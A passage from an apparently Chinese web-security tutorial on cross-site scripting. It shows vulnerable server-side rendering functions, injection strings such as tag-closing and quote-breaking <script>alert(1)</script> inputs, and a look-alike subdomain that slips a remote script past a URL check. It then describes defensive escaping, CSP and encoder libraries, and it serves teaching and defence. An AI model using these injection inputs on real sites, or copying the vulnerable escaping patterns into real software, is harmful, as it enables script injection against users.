<code>&lt;textarea&gt;</code> 这种原生会转换输入数据为字符串的标签，可以输入提前闭合标签绕过：</p><p><code>&lt;/textarea&lt;script&gt;alert(1)&lt;/script&gt;&lt;textarea&gt;</code></p><p>或者 <code>input</code>标签：</p><div class="__dumi-default-code-block"><pre class="prism-code language-js"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token comment">// Server Code</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token keyword">function</span><span class="token plain"> </span><span class="token function">serverRender</span><span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword control-flow">return</span><span class="token plain"> </span><span class="token string">&#x27;&lt;input type=&quot;name&quot; value=&#x27;</span><span class="token plain"> </span><span class="token operator">+</span><span class="token plain"> input </span><span class="token operator">+</span><span class="token plain"> </span><span class="token string">&#x27;&quot;&gt;&#x27;</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token punctuation">}</span></div></pre></div><p>输入 <code>input</code> 变量：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>输出渲染的 HTML 结构：<code>&lt;input type=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(1)&quot;&gt;</code></p><h3 id="合法-html-转义漏洞"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#合法-html-转义漏洞"><span class="icon icon-link"></span></a>合法 HTML 转义漏洞</h3><p>服务端渲染代码：将用户输入代码通过合法的 HTML 标签转义输出，返回给前端渲染</p><div class="__dumi-default-code-block"><pre class="prism-code language-js"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token comment">// Server Code</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token keyword">function</span><span class="token plain"> </span><span class="token function">serverRender</span><span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token comment">// HTML 的字符转义</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword">function</span><span class="token plain"> </span><span class="token function">escapeHtml</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">    </span><span class="token keyword control-flow">return</span><span class="token plain"> s</span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">&amp;</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;&amp;amp;&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">&#x27;</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;&amp;#39;&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">&quot;</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;&amp;quot;&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">&lt;</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;&amp;lt;&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">&gt;</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;&amp;rt;&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">\/</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;&amp;#x2f&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token punctuation">}</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword">const</span><span class="token plain"> domainReg </span><span class="token operator">=</span><span class="token plain"> </span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">^https?:\/\/www\.example\.com</span><span class="token regex regex-delimiter">/</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword control-flow">if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">domainRe</span><span class="token punctuation">.</span><span class="token method function property-access">test</span><span class="token punctuation">(</span><span class="token plain">input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">    </span><span class="token keyword control-flow">return</span><span class="token plain"> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string string">&lt;script src=&quot;</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation function">escapeHtml</span><span class="token template-string interpolation punctuation">(</span><span class="token template-string interpolation">input</span><span class="token template-string interpolation punctuation">)</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">&quot;&gt;&lt;/script&gt;</span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token punctuation">}</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword control-flow">return</span><span class="token plain"> </span><span class="token string">&#x27;Invalid URL&#x27;</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token punctuation">}</span></div></pre></div><p>攻击方法：创建多级域名，子孙级域名中带 <code>.com</code></p><div class="__dumi-default-code-block"><pre class="prism-code language-js"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token comment">// 输入</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token keyword">const</span><span class="token plain"> input </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string">&#x27;https://www.example.com.xss.com/foo.js&#x27;</span><span class="token punctuation">;</span></div></pre></div><p>输出渲染的 HTML DOM 结构：那么这个输入的 URL 就会被执行了</p><div class="__dumi-default-code-block"><pre class="prism-code language-html"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token tag punctuation">&lt;</span><span class="token tag">script</span><span class="token tag"> </span><span class="token tag attr-name">src</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">http:&amp;#x2f&amp;#x2fwww.example.com.xss.com&amp;#x2ffoo.js</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token script"></span><span class="token tag punctuation">&lt;/</span><span class="token tag">script</span><span class="token tag punctuation">&gt;</span></div></pre></div><p>HTML 转码在 URL 和 JavaScript 中都是无效的。</p><h3 id="合法-js-转义漏洞"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#合法-js-转义漏洞"><span class="icon icon-link"></span></a>合法 JS 转义漏洞</h3><div class="__dumi-default-code-block"><pre class="prism-code language-js"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token comment">// Server Code</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token keyword">function</span><span class="token plain"> </span><span class="token function">serverRender</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token comment">// JavaScript 的字符转义</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword">function</span><span class="token plain"> </span><span class="token function">escapeJs</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">    </span><span class="token keyword control-flow">return</span><span class="token plain"> s</span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">\\</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\\\&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">&#x27;</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&quot;\\&#x27;&quot;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">&quot;</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\&quot;&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">`</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\`&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">&lt;</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\74&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">&gt;</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\76&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">\/</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\/&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">\n</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\n&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">\r</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\r&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">\t</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\t&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">\f</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\f&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">\v</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\v&#x27;</span><span class="token punctuation">)</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">      </span><span class="token punctuation">.</span><span class="token method function property-access">replace</span><span class="token punctuation">(</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-source language-regex">\0</span><span class="token regex regex-delimiter">/</span><span class="token regex regex-flags">g</span><span class="token punctuation">,</span><span class="token plain"> </span><span class="token string">&#x27;\\0&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">  </span><span class="token punctuation">}</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword">const</span><span class="token plain"> s </span><span class="token operator">=</span><span class="token plain"> </span><span class="token function">escapeJs</span><span class="token punctuation">(</span><span class="token plain">s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain">  </span><span class="token keyword control-flow">return</span><span class="token plain"> </span><span class="token template-string template-punctuation string">`</span><span class="token template-string string"></span></div><div class="token-line"><span class="token template-string string">&lt;script type=&quot;application/javascript&quot;&gt;</span></div><div class="token-line"><span class="token template-string string">  var url = &#x27;javascript:console.log(&quot;</span><span class="token template-string interpolation interpolation-punctuation punctuation">${</span><span class="token template-string interpolation">s</span><span class="token template-string interpolation interpolation-punctuation punctuation">}</span><span class="token template-string string">&quot;)&#x27;</span></div><div class="token-line"><span class="token template-string string">  var a = document.createElement(&#x27;a&#x27;)</span></div><div class="token-line"><span class="token template-string string">
</span></div><div class="token-line"><span class="token template-string string">  a.href = url</span></div><div class="token-line"><span class="token template-string string">  document.body.appendChild(a)</span></div><div class="token-line"><span class="token template-string string">  a.click()</span></div><div class="token-line"><span class="token template-string string">&lt;/script&gt;</span></div><div class="token-line"><span class="token template-string string">  </span><span class="token template-string template-punctuation string">`</span><span class="token punctuation">;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token punctuation">}</span></div></pre></div><p>输出的 HTML DOM 结构：</p><div class="__dumi-default-code-block"><pre class="prism-code language-html"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token tag punctuation">&lt;</span><span class="token tag">script</span><span class="token tag"> </span><span class="token tag attr-name">type</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">application/javascript</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript keyword">var</span><span class="token script language-javascript"> url </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript string">&#x27;javascript:console.log(&quot;&quot;)&#x27;</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript keyword">var</span><span class="token script language-javascript"> a </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript dom variable">document</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript method function property-access">createElement</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript string">&#x27;a&#x27;</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">
</span></div><div class="token-line"><span class="token script language-javascript">  a</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript property-access">href</span><span class="token script language-javascript"> </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> url</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  </span><span class="token script language-javascript dom variable">document</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript property-access">body</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript method function property-access">appendChild</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript">a</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript">  a</span><span class="token script language-javascript punctuation">.</span><span class="token script language-javascript method function property-access">click</span><span class="token script language-javascript punctuation">(</span><span class="token script language-javascript punctuation">)</span><span class="token script language-javascript punctuation">;</span><span class="token script language-javascript"></span></div><div class="token-line"><span class="token script language-javascript"></span><span class="token tag punctuation">&lt;/</span><span class="token tag">script</span><span class="token tag punctuation">&gt;</span></div></pre></div><h3 id="方法总结"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#方法总结"><span class="icon icon-link"></span></a>方法总结</h3><ul><li>在 HTML 中内嵌的文本那种，恶意内容以 <code>script</code> 标签形成注入</li><li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串、变量、方法名等）</li><li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签</li><li>在标签的 <code>href</code>、<code>src</code> 等属性中，包含 <code>javascript:</code> 等可执行代码</li><li>在 <code>onload</code>、<code>onerror</code>、<code>onclick</code> 等事件中，注入不受控制代码</li><li>在 <code>style</code> 属性和标签汇总，包含类似 <code>background-image: url(&quot;javascript:...&quot;)</code> 的代码（新版本浏览器已经可以防范）</li><li>在 <code>style</code> 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）</li></ul><h2 id="防御策略"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#防御策略"><span class="icon icon-link"></span></a>防御策略</h2><p>防护原则：</p><ul><li>未雨绸缪<ul><li>HTML 正文：HTML 实体字符转义</li><li>HTML 标签：HTML 实体字符转义</li><li>HTML <code>onxxx</code> 事件属性：JS 转义</li><li>URL：URL 转义</li><li>用户富文本输入：后端白名单标签过滤，使用开源库（例如：<a target="_blank" rel="noopener noreferrer" href="https://www.npmjs.com/package/sanitize-html">sanitize-html<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="__dumi-default-external-link-icon"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>），不要用正则过滤</li></ul></li><li>配置安全协议头<ul><li>Content-Security-Policy</li></ul></li></ul><h3 id="输入过滤"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#输入过滤"><span class="icon icon-link"></span></a>输入过滤</h3><p>在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？</p><p>答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。</p><p>那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把 <strong>安全的</strong> 内容，返回给前端。这样是否可行呢？</p><p>我们举一个例子，一个正常的用户输入了 <code>5 &lt; 7</code> 这个内容，在写入数据库前，被转义，变成了 <code>5 &lt; 7</code>。</p><p>问题是：在提交阶段，我们并不确定内容要输出到哪里。</p><p>这里的 <strong>并不确定内容要输出到哪里</strong> 有两层含义：</p><ul><li>用户的输入内容可能同时提供给 Web 前端和客户端，而一旦经过了 <code>escapeHTML()</code>，客户端显示的内容就变成了乱码 <code>5 &lt; 7</code>。</li><li>在前端中，不同的位置所需的编码也不同。</li></ul><p>当 <code>5 &lt; 7</code> 作为 HTML 拼接页面时，可以正常显示：</p><div class="__dumi-default-code-block"><pre class="prism-code language-html"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag attr-name">title</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">comment</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token plain">5 </span><span class="token entity named-entity">&amp;lt;</span><span class="token plain"> 7</span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span></div></pre></div><p>当 <code>5 &lt; 7</code> 通过 AJAX 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、<code>alert</code> 等。</p><p>所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。 当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。</p><p>输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。</p><h3 id="纯前端渲染"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#纯前端渲染"><span class="icon icon-link"></span></a>纯前端渲染</h3><p>预防攻击类型：<code>存储型 XSS</code> 和 <code>反射型 XSS</code>。</p><p>纯前端渲染的过程：</p><ol><li>浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。</li><li>然后浏览器执行 HTML 中的 JavaScript。</li><li>JavaScript 通过 AJAX 加载业务数据，调用 DOM API 更新到页面上。</li></ol><p>在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本 <code>.innerText</code>，还是属性 <code>.setAttribute</code>，还是样式 <code>.style</code> 等等。如此，浏览器不会被轻易地被欺骗，执行预期外的代码。</p><p>但纯前端渲染还需注意避免 DOM 型 XSS 漏洞，例如 <code>onload</code> 事件和 <code>href</code> 中的 <code>javascript:xxx</code> 等。</p><p>在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。</p><h3 id="转义-html"><a aria-hidden="true" tabindex="-1" href="/black-javascript-guidebook//computer-networks/web-security/xss#转义-html"><span class="icon icon-link"></span></a>转义 HTML</h3><p>如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。 常用的模板引擎，如 <code>doT.js</code>、<code>ejs</code>、<code>FreeMarker</code> 等，对于 HTML 转义通常只有一个规则，就是把 <code>&amp; &lt; &gt; &quot; &#x27; /</code> 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：</p><div class="__dumi-default-table"><div class="__dumi-default-table-content"><table><thead><tr><th align="left">XSS 安全漏洞</th><th align="left">简单转义是否有防护作用</th></tr></thead><tbody><tr><td align="left">HTML 标签文字内容</td><td align="left">有</td></tr><tr><td align="left">HTML 属性值</td><td align="left">有</td></tr><tr><td align="left">CSS 内联样式</td><td align="left">无</td></tr><tr><td align="left">内联 JavaScript</td><td align="left">无</td></tr><tr><td align="left">内联 JSON</td><td align="left">无</td></tr><tr><td align="left">跳转链接</td><td align="left">无</td></tr></tbody></table></div></div><p>所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。</p><p>例如 Java 工程里，常用的转义库 <code>org.owasp.encoder</code>。</p><div class="__dumi-default-code-block"><pre class="prism-code language-html"><button class="__dumi-default-icon __dumi-default-code-block-copy-btn" data-status="ready"></button><div class="token-line"><span class="token comment">&lt;!-- HTML 标签内文字内容 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="token plain">&lt;%= Encode.forHtml(UNTRUSTED) %&gt;</span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- HTML 标签属性值 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">input</span><span class="token tag"> </span><span class="token tag attr-name">value</span><span class="token tag attr-value punctuation attr-equals">=</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag attr-value">&lt;%= Encode.forHtml(UNTRUSTED) %&gt;</span><span class="token tag attr-value punctuation">&quot;</span><span class="token tag"> </span><span class="token tag punctuation">/&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- CSS 属性值 --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag special-attr attr-name">style</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag special-attr attr-value value css language-css property">width</span><span class="token tag special-attr attr-value value css language-css punctuation">:</span><span class="token tag special-attr attr-value value css language-css">&lt;= Encode.</span><span class="token tag special-attr attr-value value css language-css function">forCssString</span><span class="token tag special-attr attr-value value css language-css punctuation">(</span><span class="token tag special-attr attr-value value css language-css">UNTRUSTED</span><span class="token tag special-attr attr-value value css language-css punctuation">)</span><span class="token tag special-attr attr-value value css language-css"> %&gt;</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
</span></div><div class="token-line"><span class="token plain"></span><span class="token comment">&lt;!-- CSS URL --&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain"></span><span class="token tag punctuation">&lt;</span><span class="token tag">div</span><span class="token tag"> </span><span class="token tag special-attr attr-name">style</span><span class="token tag special-attr attr-value punctuation attr-equals">=</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag special-attr attr-value value css language-css property">background</span><span class="token tag special-attr attr-value value css language-css punctuation">:</span><span class="token tag special-attr attr-value value css language-css">&lt;= Encode.</span><span class="token tag special-attr attr-value value css language-css function">forCssUrl</span><span class="token tag special-attr attr-value value css language-css punctuation">(</span><span class="token tag special-attr attr-value value css language-css">UNTRUSTED</span><span class="token tag special-attr attr-value value css language-css punctuation">)</span><span class="token tag special-attr attr-value value css language-css"> %&gt;</span><span class="token tag special-attr attr-value punctuation">&quot;</span><span class="token tag punctuation">&gt;</span><span class="token tag punctuation">&lt;/</span><span class="token tag">div</span><span class="token tag punctuation">&gt;</span><span class="token plain"></span></div><div class="token-line"><span class="token plain">
